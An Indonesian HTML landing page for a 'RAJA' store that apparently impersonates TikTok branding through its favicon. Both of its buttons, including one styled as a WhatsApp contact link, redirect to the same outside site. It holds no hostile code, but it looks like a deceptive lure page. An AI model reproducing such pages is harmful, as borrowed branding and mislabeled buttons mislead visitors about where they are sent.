



<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAJA - Official</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">

    <style>
        /* Reset & Layout */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        
        body { 
            height: 100vh; 
            overflow: hidden; 
            /* Background utama */
            background: url('https://i.pinimg.com/736x/ea/60/b3/ea60b339f7968cd24f2275f3d5b694c7.jpg') no-repeat center center fixed; 
            background-size: cover;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Gelap tipis di atas background */
        .overlay { position: fixed; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 0; }

        /* Konten utama */
        .content {
            position: relative;
            z-index: 1;
            width: 90%; 
            max-width: 400px; 
            text-align: center; 
            color: white;
            padding: 20px;
            background: rgba(0,0,0,0.3);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }

        .card-img {
            width: 100%; 
            border-radius: 15px; 
            margin-bottom: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5); 
            border: 2px solid rgba(255,255,255,0.1);
        }

        h2 { margin: 10px 0; letter-spacing: 1px; color: #ffd700; }
        p { font-size: 14px; opacity: 0.9; }

        /* Area Tombol */
        .btn-group { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
        
        .btn {
            padding: 15px; 
            width: 100%; 
            border: none; 
            border-radius: 50px;
            font-weight: bold; 
            cursor: pointer; 
            font-size: 16px; 
            text-transform: uppercase;
            transition: transform 0.2s, background 0.3s;
        }

        .btn:active { transform: scale(0.95); }

        .btn-wa { background: #25d366; color: white; box-shadow: 0 0 15px #25d366; }
        .btn-link { background: #ff0050; color: white; box-shadow: 0 0 15px #ff0050; }

        .footer { margin-top: 25px; font-size: 12px; opacity: 0.6; }
    </style>
</head>
<body>

    <div class="overlay"></div>

    <div class="content">
        <img src="https://i.gyazo.com/thumb/1000/3ad0ecae1bdebb350af3a8bc77c8c67c-png.jpg" alt="Banner" class="card-img">
        
        <p>Akses Ke Toko Paling Best no 1 di Indonesia</p>
        <h2>RAJA</h2>

        <div class="btn-group">
            <button class="btn btn-link" onclick="window.location.href='https://sawer-tiktok-raja.pages.dev/'">LANJUTKAN KE SITUS</button>
            <button class="btn btn-wa" onclick="window.location.href='https://sawer-tiktok-raja.pages.dev/'">HUBUNGI TOKO</button>
        </div>

        <div class="footer">
            &copy; 2022–2026 RAJA | TOKO RAJA
        </div>
    </div>

</body>
</html>
